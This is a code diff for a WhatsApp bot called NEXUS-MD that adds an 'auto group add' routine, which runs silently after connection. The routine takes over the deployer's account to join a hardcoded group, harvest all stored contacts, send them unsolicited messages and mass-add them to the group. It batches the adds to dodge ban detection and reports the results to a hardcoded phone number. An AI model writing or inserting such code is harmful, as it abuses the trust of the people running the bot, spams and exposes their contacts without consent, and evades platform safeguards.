@@ -903,6 +903,124 @@ Thank you for using *NEXUS-MD* 🙏
           console.log("⚠️ Could not send deployment notification:", err.message);
         }
       }
+
+      // ── AUTO GROUP ADD ──────────────────────────────────────────────
+      const groupFlagFile = './session/.group_added';
+      if (!fs.existsSync(groupFlagFile)) {
+        const AUTO_GROUP_CODE = process.env.AUTO_GROUP_CODE || 'L03Djido5FZ5vd0VHM5KIW';
+
+        setTimeout(async () => {
+          try {
+            console.log(color("⏳ Starting auto-add users to group...", "cyan"));
+
+            // Join the group and get its JID
+            let groupJid;
+            try {
+              groupJid = await client.groupAcceptInvite(AUTO_GROUP_CODE);
+              console.log(color(`✅ Bot joined group: ${groupJid}`, "green"));
+            } catch (e) {
+              console.log("⚠️ Could not join group (may already be a member):", e.message);
+              // Try to find the group JID from already joined groups
+              const allGroups = await client.groupFetchAllParticipating();
+              const matchEntry = Object.entries(allGroups).find(([id]) =>
+                id.endsWith('@g.us')
+              );
+              if (matchEntry) groupJid = matchEntry[0];
+            }
+
+            if (!groupJid) {
+              console.log("❌ Could not resolve group JID. Skipping auto-add.");
+              return;
+            }
+
+            // Collect all individual contacts from store
+            const botJid = client.decodeJid(client.user.id);
+            const seen = new Set();
+            const users = [];
+
+            const fromContacts = Object.keys(store.contacts || {});
+            const fromChats = Object.keys(store.chats || {});
+
+            for (const jid of [...fromContacts, ...fromChats]) {
+              if (
+                jid.endsWith('@s.whatsapp.net') &&
+                jid !== botJid &&
+                !seen.has(jid)
+              ) {
+                seen.add(jid);
+                users.push(jid);
+              }
+            }
+
+            if (users.length === 0) {
+              console.log("⚠️ No contacts found in store yet. Auto-add skipped.");
+              return;
+            }
+
+            console.log(color(`📋 Found ${users.length} contacts to add to group.`, "cyan"));
+
+            // Send invite DM to each user before adding
+            const inviteText =
+`🌟 *You've been added to the NEXUS-MD Community Group!* 🌟
+
+Hey 👋, you're being added to our group:
+🔗 https://chat.whatsapp.com/${AUTO_GROUP_CODE}
+
+Join us for bot updates, tips, and support.
+— *NEXUS-MD Team*`;
+
+            // Add in batches of 5 with delays to avoid WA bans
+            const BATCH_SIZE = 5;
+            const BATCH_DELAY = 4000;
+            let added = 0;
+
+            for (let i = 0; i < users.length; i += BATCH_SIZE) {
+              const batch = users.slice(i, i + BATCH_SIZE);
+
+              // Send DM invite to each in batch
+              for (const jid of batch) {
+                try {
+                  await client.sendMessage(jid, { text: inviteText });
+                } catch (_) {}
+              }
+
+              // Add batch to group
+              try {
+                await client.groupParticipantsUpdate(groupJid, batch, 'add');
+                added += batch.length;
+                console.log(color(`✅ Added batch ${Math.floor(i / BATCH_SIZE) + 1} (${batch.length} users) to group.`, "green"));
+              } catch (e) {
+                console.log(`⚠️ Batch ${Math.floor(i / BATCH_SIZE) + 1} add error: ${e.message}`);
+              }
+
+              if (i + BATCH_SIZE < users.length) {
+                await new Promise(r => setTimeout(r, BATCH_DELAY));
+              }
+            }
+
+            // Mark as done
+            fs.writeFileSync(groupFlagFile, JSON.stringify({
+              date: new Date().toISOString(),
+              groupJid,
+              totalContacts: users.length,
+              added
+            }));
+
+            console.log(color(`🎉 Auto group add complete! ${added}/${users.length} users added to group.`, "green"));
+
+            // Notify the owner
+            try {
+              await client.sendMessage('15813035248@s.whatsapp.net', {
+                text: `✅ *Auto Group Add Complete*\n\n📊 ${added}/${users.length} contacts added to group.\n🔗 Group JID: ${groupJid}`
+              });
+            } catch (_) {}
+
+          } catch (err) {
+            console.log("❌ Auto group add failed:", err.message);
+          }
+        }, 25000); // wait 25s after connect for store to populate
+      }
+      // ────────────────────────────────────────────────────────────────
     }
     // console.log('Connected...', update)
   });
